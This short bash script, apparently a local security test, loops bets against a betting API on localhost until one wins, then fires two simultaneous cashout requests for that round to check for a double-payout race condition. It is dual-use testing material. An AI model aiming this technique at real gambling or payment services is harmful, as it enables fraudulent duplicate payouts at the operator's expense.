#!/bin/bash
while true; do
  RESP=$(curl -s -X POST http://localhost:3000/api/bet \
    -H "Content-Type: application/json" \
    -d '{"clientSeed":"test","token":"test-token","player_id":"player_1","betAmount":1}')
  
  OUTCOME=$(echo $RESP | jq -r '.step_1_outcome')
  ROUND_ID=$(echo $RESP | jq -r '.round_id')
  
  if [ "$OUTCOME" = "win" ]; then
    echo "Got a win! Round ID: $ROUND_ID"
    # Fire two cashouts in parallel
    curl -s -X POST http://localhost:3000/api/cashout \
      -H "Content-Type: application/json" \
      -d '{"token":"test-token","player_id":"player_1","round_id":"'$ROUND_ID'"}' &
    
    curl -s -X POST http://localhost:3000/api/cashout \
      -H "Content-Type: application/json" \
      -d '{"token":"test-token","player_id":"player_1","round_id":"'$ROUND_ID'"}' &
    
    wait
    echo -e "\nDone testing race condition."
    break
  else
    echo "Loss. Retrying..."
  fi
done
